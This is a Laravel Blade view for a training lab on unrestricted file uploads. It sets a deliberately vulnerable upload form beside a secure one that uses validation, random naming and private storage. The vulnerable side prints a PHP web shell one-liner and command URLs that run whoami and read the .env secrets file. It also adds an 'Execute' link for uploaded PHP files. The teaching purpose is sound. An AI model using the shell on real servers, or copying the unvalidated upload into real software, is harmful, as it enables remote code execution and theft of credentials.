@extends('layouts.app')
@section('title', 'File Upload')

@section('content')
<div class="mb-8">
    <h1 class="text-3xl font-bold text-gray-800">Unrestricted File Upload Lab</h1>
    <p class="text-gray-500 mt-1">Learn how validation, secure naming, and safe storage prevent file upload attacks.</p>
</div>

{{-- Security Mode Toggle --}}
<div class="bg-blue-50 border border-blue-300 rounded-xl p-4 mb-8 flex items-center justify-between">
    <div class="flex items-center gap-3">
        <span class="text-2xl">🔐</span>
        <div>
            <p class="font-semibold text-blue-800">Security Mode Toggle</p>
            <p class="text-sm text-blue-700">Switch between vulnerable and secure implementations to see the difference.</p>
        </div>
    </div>
    <div class="flex items-center gap-3">
        <button onclick="toggleMode('vulnerable')" id="btn-vulnerable"
                class="px-4 py-2 bg-red-500 text-white font-semibold rounded-lg hover:bg-red-600 transition security-btn active"
                data-mode="vulnerable">
            🚨 Vulnerable Mode
        </button>
        <button onclick="toggleMode('secure')" id="btn-secure"
                class="px-4 py-2 bg-gray-300 text-gray-700 font-semibold rounded-lg hover:bg-gray-400 transition security-btn"
                data-mode="secure">
            ✅ Secure Mode
        </button>
    </div>
</div>

<div id="vulnerable-mode" class="mode-content">
    {{-- Vulnerable Info Banner --}}
    <div class="bg-red-50 border border-red-300 rounded-xl p-4 mb-8 flex items-start gap-3">
        <span class="text-2xl">⚠️</span>
        <div>
            <p class="font-semibold text-red-800">OWASP A04 — Insecure Design (Vulnerable)</p>
            <p class="text-sm text-red-700 mt-1">
                The server does <strong>NOT</strong> validate file type, MIME type, or extension. Upload a <code class="bg-red-100 px-1 rounded font-mono">.php</code> file and access it at
                <code class="bg-red-100 px-1 rounded font-mono">/uploads/your-file.php</code> to execute arbitrary code (RCE).
            </p>
        </div>
    </div>

    <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
        {{-- Vulnerable Upload Form --}}
        <div class="bg-white rounded-xl shadow p-8 border-l-4 border-red-500">
            <h2 class="text-xl font-semibold text-gray-800 mb-6 flex items-center gap-2">
                <span>📤</span> Upload File (Vulnerable)
            </h2>

            @if (session('success'))
                <div class="bg-green-50 border border-green-300 text-green-800 rounded-lg p-4 mb-5 text-sm">
                    {!! session('success') !!}
                </div>
            @endif

            @if (session('error'))
                <div class="bg-red-50 border border-red-300 text-red-700 rounded-lg p-4 mb-5 text-sm">
                    {{ session('error') }}
                </div>
            @endif

            <form method="POST" action="/student/upload/vulnerable" enctype="multipart/form-data">
                @csrf
                <div class="mb-6">
                    <label class="block text-sm font-medium text-gray-700 mb-2">Choose File</label>
                    <div class="border-2 border-dashed border-red-300 rounded-xl p-6 text-center hover:border-red-400 transition">
                        <span class="text-4xl block mb-2">📂</span>
                        <p class="text-sm text-gray-500 mb-3">Any file type accepted — NO restrictions</p>
                        <input type="file" name="avatar" id="avatar-vulnerable"
                               class="block w-full text-sm text-gray-700 file:mr-3 file:py-2 file:px-4
                                      file:rounded-lg file:border-0 file:font-medium
                                      file:bg-red-100 file:text-red-700 hover:file:bg-red-200 cursor-pointer">
                    </div>
                </div>
                <button type="submit"
                        class="w-full bg-red-500 hover:bg-red-600 text-white font-semibold py-2.5 rounded-lg transition">
                    Upload File
                </button>
            </form>
        </div>

        {{-- Exploit Guide --}}
        <div class="bg-white rounded-xl shadow p-8 border-l-4 border-red-400">
            <h2 class="text-xl font-semibold text-gray-800 mb-5 flex items-center gap-2">
                <span>🧪</span> Exploit Guide
            </h2>

            <ol class="space-y-4 text-sm text-gray-700">
                <li class="flex gap-3">
                    <span class="flex-shrink-0 w-6 h-6 rounded-full bg-red-100 text-red-700 font-bold text-xs flex items-center justify-center">1</span>
                    <div>
                        <p class="font-medium">Create a PHP web shell</p>
                        <div class="mt-1 bg-gray-900 text-green-400 font-mono text-xs rounded-lg p-3">
                            &lt;?php system($_GET['cmd']); ?&gt;
                        </div>
                        <p class="text-gray-400 mt-1">Save as <code class="bg-gray-100 px-1 rounded">shell.php</code></p>
                    </div>
                </li>
                <li class="flex gap-3">
                    <span class="flex-shrink-0 w-6 h-6 rounded-full bg-red-100 text-red-700 font-bold text-xs flex items-center justify-center">2</span>
                    <div>
                        <p class="font-medium">Upload the file using the Vulnerable form</p>
                        <p class="text-gray-400 mt-1">No validation — the file will be accepted immediately.</p>
                    </div>
                </li>
                <li class="flex gap-3">
                    <span class="flex-shrink-0 w-6 h-6 rounded-full bg-red-100 text-red-700 font-bold text-xs flex items-center justify-center">3</span>
                    <div>
                        <p class="font-medium">Execute commands via the shell</p>
                        <div class="mt-1 bg-gray-900 text-green-400 font-mono text-xs rounded-lg p-3">
                            /uploads/shell.php?cmd=whoami<br>
                            /uploads/shell.php?cmd=cat+.env
                        </div>
                    </div>
                </li>
            </ol>
        </div>
    </div>

    {{-- Vulnerable Uploaded Files List --}}
    <div class="mt-8 bg-white rounded-xl shadow p-8 border-l-4 border-red-400">
        <h2 class="text-xl font-semibold text-gray-800 mb-5 flex items-center gap-2">
            <span>⚡</span> Executed Files (Vulnerable)
            <span class="ml-2 text-sm font-normal text-gray-400">({{ $vulnerableFiles->count() }} file{{ $vulnerableFiles->count() === 1 ? '' : 's' }})</span>
        </h2>

        @if ($vulnerableFiles->isEmpty())
            <p class="text-sm text-gray-400 text-center py-6">No files uploaded yet.</p>
        @else
            <div class="overflow-x-auto">
                <table class="w-full text-sm">
                    <thead>
                        <tr class="bg-red-50 text-left text-xs font-semibold text-red-700 uppercase tracking-wide">
                            <th class="px-4 py-3 rounded-tl-lg">#</th>
                            <th class="px-4 py-3">Filename</th>
                            <th class="px-4 py-3">Size (KB)</th>
                            <th class="px-4 py-3">Type</th>
                            <th class="px-4 py-3 rounded-tr-lg">Action</th>
                        </tr>
                    </thead>
                    <tbody class="divide-y divide-red-100">
                        @foreach ($vulnerableFiles as $i => $file)
                            @php
                                $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
                                $isDanger = in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'phar']);
                            @endphp
                            <tr class="hover:bg-red-50 transition bg-red-50">
                                <td class="px-4 py-3 text-red-500">{{ $i + 1 }}</td>
                                <td class="px-4 py-3 font-mono font-medium text-red-700">
                                    {{ $file['name'] }}
                                    @if ($isDanger)
                                        <span class="ml-2 text-xs bg-red-200 text-red-800 px-1.5 py-0.5 rounded font-sans">⚠️ RCE</span>
                                    @endif
                                </td>
                                <td class="px-4 py-3 text-red-600">{{ $file['size'] }} KB</td>
                                <td class="px-4 py-3">
                                    <span class="text-xs px-2 py-0.5 rounded font-mono bg-red-200 text-red-700">
                                        .{{ $ext }}
                                    </span>
                                </td>
                                <td class="px-4 py-3 flex items-center gap-3">
                                    <a href="{{ $file['url'] }}" target="_blank"
                                       class="text-blue-600 hover:underline text-xs">Open</a>
                                    @if ($isDanger)
                                        <a href="{{ $file['url'] }}?cmd=whoami" target="_blank"
                                           class="text-red-600 hover:underline text-xs font-bold">▶ Execute</a>
                                    @endif
                                </td>
                            </tr>
                        @endforeach
                    </tbody>
                </table>
            </div>
        @endif
    </div>
</div>

<div id="secure-mode" class="mode-content hidden">
    {{-- Secure Info Banner --}}
    <div class="bg-green-50 border border-green-300 rounded-xl p-4 mb-8 flex items-start gap-3">
        <span class="text-2xl">✅</span>
        <div>
            <p class="font-semibold text-green-800">OWASP A04 — Secure Implementation (Protected)</p>
            <p class="text-sm text-green-700 mt-1">
                <strong>3 layers of defense:</strong>
            </p>
            <ul class="text-sm text-green-700 mt-2 space-y-1 ml-4">
                <li><strong>Layer 1 — Validation:</strong> Check MIME type, extension, and file size (max 2MB)</li>
                <li><strong>Layer 2 — Secure Naming:</strong> Generate random filename (e.g., 1742680923_aBcDeFgHiJ.jpg)</li>
                <li><strong>Layer 3 — Safe Storage:</strong> Store outside public/ dir — files are NOT web-executable</li>
            </ul>
            <p class="text-sm text-green-700 mt-2">
                Even if attacker renames shell.php to shell.jpg, Laravel's <code class="bg-green-100 px-1 rounded font-mono">image</code> validator checks MIME type (file content), not just extension.
            </p>
        </div>
    </div>

    <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
        {{-- Secure Upload Form --}}
        <div class="bg-white rounded-xl shadow p-8 border-l-4 border-green-500">
            <h2 class="text-xl font-semibold text-gray-800 mb-6 flex items-center gap-2">
                <span>📤</span> Upload File (Secure)
            </h2>

            @if (session('success'))
                <div class="bg-green-50 border border-green-300 text-green-800 rounded-lg p-4 mb-5 text-sm">
                    {{ session('success') }}
                </div>
            @endif

            @if ($errors->any())
                <div class="bg-red-50 border border-red-300 text-red-700 rounded-lg p-4 mb-5 text-sm">
                    <strong>Validation Failed:</strong>
                    <ul class="mt-2 list-disc list-inside space-y-1">
                        @foreach ($errors->all() as $error)
                            <li>{{ $error }}</li>
                        @endforeach
                    </ul>
                </div>
                <script>
                    document.addEventListener('DOMContentLoaded', function() {
                        showErrorModal('{{ implode('|', $errors->all()) }}');
                    });
                </script>
            @endif

            <form method="POST" action="/student/upload/secure" enctype="multipart/form-data">
                @csrf
                <div class="mb-6">
                    <label class="block text-sm font-medium text-gray-700 mb-2">Choose Image File</label>
                    <div class="border-2 border-dashed border-green-300 rounded-xl p-6 text-center hover:border-green-400 transition">
                        <span class="text-4xl block mb-2">🖼️</span>
                        <p class="text-sm text-gray-500 mb-3">Only images allowed: JPEG, PNG (max 2MB)</p>
                        <input type="file" name="avatar" id="avatar-secure"
                               class="block w-full text-sm text-gray-700 file:mr-3 file:py-2 file:px-4
                                      file:rounded-lg file:border-0 file:font-medium
                                      file:bg-green-100 file:text-green-700 hover:file:bg-green-200 cursor-pointer">
                    </div>
                </div>
                <button type="submit"
                        class="w-full bg-green-500 hover:bg-green-600 text-white font-semibold py-2.5 rounded-lg transition">
                    Upload Securely
                </button>
            </form>
        </div>

        {{-- Defense Explanation --}}
        <div class="bg-white rounded-xl shadow p-8 border-l-4 border-green-400">
            <h2 class="text-xl font-semibold text-gray-800 mb-5 flex items-center gap-2">
                <span>🛡️</span> Defense Layers
            </h2>

            <ol class="space-y-4 text-sm text-gray-700">
                <li class="flex gap-3">
                    <span class="flex-shrink-0 w-6 h-6 rounded-full bg-green-100 text-green-700 font-bold text-xs flex items-center justify-center">1️⃣</span>
                    <div>
                        <p class="font-medium text-green-700">Validation (Input Control)</p>
                        <div class="mt-1 bg-gray-900 text-green-400 font-mono text-xs rounded-lg p-3">
$validate([<br/>
&nbsp;&nbsp;'avatar' => [<br/>
&nbsp;&nbsp;&nbsp;&nbsp;'required', 'image',<br/>
&nbsp;&nbsp;&nbsp;&nbsp;'mimes:jpeg,png,jpg',<br/>
&nbsp;&nbsp;&nbsp;&nbsp;'max:2048'<br/>
&nbsp;&nbsp;]<br/>
])
                        </div>
                        <p class="text-gray-400 mt-1">Checks MIME type (file content) + extension + size</p>
                    </div>
                </li>
                <li class="flex gap-3">
                    <span class="flex-shrink-0 w-6 h-6 rounded-full bg-green-100 text-green-700 font-bold text-xs flex items-center justify-center">2️⃣</span>
                    <div>
                        <p class="font-medium text-green-700">Secure Naming (Randomize)</p>
                        <div class="mt-1 bg-gray-900 text-green-400 font-mono text-xs rounded-lg p-3">
$fileName = time() . '_'<br/>
&nbsp;&nbsp;. Str::random(10)<br/>
&nbsp;&nbsp;. '.' . $ext;
                        </div>
                        <p class="text-gray-400 mt-1">Prevents directory traversal & filename attacks</p>
                    </div>
                </li>
                <li class="flex gap-3">
                    <span class="flex-shrink-0 w-6 h-6 rounded-full bg-green-100 text-green-700 font-bold text-xs flex items-center justify-center">3️⃣</span>
                    <div>
                        <p class="font-medium text-green-700">Safe Storage (Outside public/)</p>
                        <div class="mt-1 bg-gray-900 text-green-400 font-mono text-xs rounded-lg p-3">
$file->storeAs(<br/>
&nbsp;&nbsp;'private/avatars',<br/>
&nbsp;&nbsp;$fileName<br/>
)
                        </div>
                        <p class="text-gray-400 mt-1">Files stored outside public/ — cannot be executed by web server</p>
                    </div>
                </li>
            </ol>
        </div>
    </div>

    {{-- Secure Uploaded Files List --}}
    <div class="mt-8 bg-white rounded-xl shadow p-8 border-l-4 border-green-400">
        <h2 class="text-xl font-semibold text-gray-800 mb-5 flex items-center gap-2">
            <span>✅</span> Safely Stored Files
            <span class="ml-2 text-sm font-normal text-gray-400">({{ $secureFiles->count() }} file{{ $secureFiles->count() === 1 ? '' : 's' }})</span>
        </h2>

        @if ($secureFiles->isEmpty())
            <p class="text-sm text-gray-400 text-center py-6">No files uploaded securely yet.</p>
        @else
            <div class="overflow-x-auto">
                <table class="w-full text-sm">
                    <thead>
                        <tr class="bg-green-50 text-left text-xs font-semibold text-green-700 uppercase tracking-wide">
                            <th class="px-4 py-3 rounded-tl-lg">#</th>
                            <th class="px-4 py-3">Filename</th>
                            <th class="px-4 py-3">Size (KB)</th>
                            <th class="px-4 py-3 rounded-tr-lg">Status</th>
                        </tr>
                    </thead>
                    <tbody class="divide-y divide-green-100">
                        @foreach ($secureFiles as $i => $file)
                            <tr class="hover:bg-green-50 transition bg-green-50">
                                <td class="px-4 py-3 text-green-600">{{ $i + 1 }}</td>
                                <td class="px-4 py-3 font-mono font-medium text-green-700">{{ $file['name'] }}</td>
                                <td class="px-4 py-3 text-green-600">{{ $file['size'] }} KB</td>
                                <td class="px-4 py-3">
                                    <span class="text-xs px-2 py-1 rounded-full bg-green-200 text-green-700 font-semibold">
                                        ✅ Protected
                                    </span>
                                </td>
                            </tr>
                        @endforeach
                    </tbody>
                </table>
            </div>
        @endif
    </div>
</div>

<script>
function toggleMode(mode) {
    // Hide all modes
    document.querySelectorAll('.mode-content').forEach(el => el.classList.add('hidden'));
    
    // Show selected mode
    document.getElementById(mode + '-mode').classList.remove('hidden');
    
    // Update button styles
    document.querySelectorAll('.security-btn').forEach(btn => {
        btn.classList.remove('active', 'bg-red-500', 'hover:bg-red-600', 'bg-green-500', 'hover:bg-green-600');
        btn.classList.add('bg-gray-300', 'text-gray-700', 'hover:bg-gray-400');
    });
    
    const activeBtn = document.querySelector(`[data-mode="${mode}"]`);
    activeBtn.classList.remove('bg-gray-300', 'text-gray-700', 'hover:bg-gray-400');
    activeBtn.classList.add('active');
    
    if (mode === 'vulnerable') {
        activeBtn.classList.add('bg-red-500', 'text-white', 'hover:bg-red-600');
    } else {
        activeBtn.classList.add('bg-green-500', 'text-white', 'hover:bg-green-600');
    }
}
</script>

{{-- Error Modal --}}
<div id="errorModal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
    <div class="bg-white rounded-2xl shadow-2xl p-8 max-w-md w-96 transform transition-all">
        <div class="flex items-center justify-center mb-4">
            <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center">
                <span class="text-3xl">❌</span>
            </div>
        </div>
        <h3 class="text-2xl font-bold text-center text-gray-800 mb-4">Validation Failed</h3>
        <div id="errorMessage" class="bg-red-50 border border-red-300 rounded-lg p-4 mb-6 text-red-700 text-sm space-y-2">
            <!-- Errors will be inserted here -->
        </div>
        <div class="space-y-3">
            <p class="text-sm text-gray-600 text-center">
                Your file didn't pass security validation. Make sure:
            </p>
            <ul class="text-sm text-gray-600 space-y-1 ml-4 list-disc">
                <li>File is an actual image (JPEG, PNG)</li>
                <li>File size is under 2MB</li>
                <li>File content matches the extension</li>
            </ul>
        </div>
        <button onclick="closeErrorModal()" 
                class="w-full mt-6 bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2.5 rounded-lg transition">
            Try Again
        </button>
    </div>
</div>

<script>
function showErrorModal(errorText) {
    const modal = document.getElementById('errorModal');
    const errorMessage = document.getElementById('errorMessage');
    
    // Split errors by | delimiter and display them
    const errors = errorText.split('|').filter(e => e.trim());
    errorMessage.innerHTML = errors.map(error => `<p>• ${error.trim()}</p>`).join('');
    
    // Auto-switch to Secure Mode
    toggleMode('secure');
    
    modal.classList.remove('hidden');
}

function closeErrorModal() {
    document.getElementById('errorModal').classList.add('hidden');
}

// Close modal when clicking outside
document.addEventListener('click', function(event) {
    const modal = document.getElementById('errorModal');
    if (event.target === modal) {
        closeErrorModal();
    }
});
</script>
@endsection
